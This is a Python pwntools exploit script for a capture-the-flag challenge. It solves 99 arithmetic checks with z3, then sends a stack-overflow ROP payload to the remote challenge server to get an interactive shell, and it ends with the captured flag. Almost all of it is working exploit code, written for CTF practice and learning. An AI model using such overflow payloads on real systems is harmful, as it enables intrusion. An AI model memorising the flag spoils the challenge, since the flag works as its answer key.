#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 14011 problems
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("problems")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "0.cloud.chals.io"
port = int(args.PORT or 14011)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
b *0x004015c4
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

from subprocess import *
from z3 import *

io = start()

rands = check_output(["./prob"]).splitlines()

x = [BitVec(f"{i}", 32) for i in range(100)]

s = Solver()

i = 1
j = 0
k = 0
ans = []
while i < 100:
    nonce1 = int(rands[j].decode("utf-8"))
    nonce2 = int(rands[j + 1].decode("utf-8"))
    if i % 10 == 0:
        s.add(x[k] + (nonce1 - nonce2) + i == 1337)
    elif i % 10 == 1:
        s.add(((i + nonce1 + nonce2) - x[k]) == 1337)
    elif i % 10 == 2:
        s.add(x[k] + ((nonce1 - nonce2) - i) == 1337)
    elif i % 10 == 3:
        s.add((i + (nonce1 - nonce2)) - x[k] == 1337)
    elif i % 10 == 4:
        s.add((((nonce2 + nonce1) - i) - x[k]) == 1337)
    elif i % 10 == 5:
        s.add(x[k] + nonce1 * nonce2 + i == 1337)
    elif i % 10 == 6:
        s.add(x[k] + nonce2 * i + nonce1 == 1337)
    elif i % 10 == 7:
        s.add(i * x[k] + nonce1 + nonce2 == 1337)
    elif i % 10 == 8:
        s.add(x[k] + nonce1 * nonce2 * i == 1337)
    else:
        s.add((x[k] + nonce1 + nonce2 + i == 1337))
    s.check()
    k += 1
    i += 1
    j += 2
m = s.model()
answer = [str(int(str(m[x[i]]))) for i in range(len(m))]

for i in range(99):
    io.sendline(answer[i])

payload = b'A'*16
payload += p64(0x000000000040169b)
payload += p64(0x404078)
payload += p64(0x00401207)

io.send(payload)

io.interactive()

# uscg{br1ck_w4lls_g1v3_us_ch4nc3_2_sh0w_h0w_b4dly_w3_w4nt_s0m3th1ng}

